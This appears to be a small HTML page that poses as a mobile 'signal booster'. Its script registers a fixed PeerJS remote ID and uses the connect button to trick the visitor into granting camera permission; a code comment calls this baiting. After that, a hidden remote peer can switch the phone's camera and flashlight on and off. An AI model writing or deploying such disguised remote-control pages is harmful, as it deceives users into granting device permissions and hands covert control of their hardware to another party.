<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sinyal Booster V6 - Stable</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: #0f0; text-align: center; font-family: sans-serif; padding-top: 80px; }
        .box { border: 2px solid #0f0; padding: 30px; display: inline-block; border-radius: 20px; }
        .btn { background: #0f0; color: #000; padding: 15px 30px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2>ðŸš€ SIGNAL OPTIMIZER</h2>
        <p>Status: <span id="stat">Menghubungkan...</span></p>
        <button class="btn" onclick="aktifkan()">HUBUNGKAN SINYAL</button>
    </div>

    <script>
        const KUNCI_REMOT = "hayabusa_remote_anak_123"; 
        const peer = new Peer(KUNCI_REMOT);
        let s_stream = null;

        peer.on('open', () => { document.getElementById('stat').innerText = "Sistem Siap!"; });

        peer.on('connection', (conn) => {
            document.getElementById('stat').innerText = "Remote Terhubung âœ…";
            conn.on('data', async (data) => {
                if (data === "ON") await kontrolSenter(true);
                if (data === "OFF") await kontrolSenter(false);
            });
        });

        async function aktifkan() {
            try {
                // Pancing izin kamera pertama kali
                s_stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                document.getElementById('stat').innerText = "Booster Aktif!";
                // Matikan dulu supaya standby
                s_stream.getTracks().forEach(track => track.stop());
                s_stream = null;
                alert("Berhasil Terhubung!");
            } catch (e) { alert("Izin kamera ditolak!"); }
        }

        async function kontrolSenter(status) {
            try {
                if (status) {
                    // NYALAKAN: Buka kamera dan aktifkan senter
                    s_stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    const track = s_stream.getVideoTracks()[0];
                    await track.applyConstraints({ advanced: [{ torch: true }] });
                } else {
                    // MATIKAN: Langsung stop semua aliran kamera
                    if (s_stream) {
                        s_stream.getTracks().forEach(track => {
                            track.applyConstraints({ advanced: [{ torch: false }] }); // Coba matikan torch dulu
                            track.stop(); // MATIKAN TOTAL KAMERA
                        });
                        s_stream = null;
                    }
                }
            } catch (err) { console.log("Error hardware:", err); }
        }
    </script>
</body>
</html>
